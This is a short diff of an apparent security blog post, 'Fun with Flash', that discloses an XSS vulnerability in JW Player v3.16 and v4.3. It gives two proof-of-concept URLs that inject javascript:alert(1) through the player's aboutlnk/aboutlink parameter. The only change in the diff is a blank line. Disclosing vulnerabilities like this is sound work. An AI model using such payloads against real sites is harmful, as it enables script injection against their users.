@@ -6,6 +6,7 @@ title: Fun with Flash
 JW Player v3.16 and v4.3 have an XSS vulnerability.  It's not serious, though, since it requires user interaction to cause the code to execute.
 
 v3.16 POC:```http://localhost/mediaplayer.swf?aboutlnk=javascript:alert(1)```
+
 v4.3 POC:```http://localhost/mediaplayer.swf?aboutlink=javascript:alert(1)```
 
 
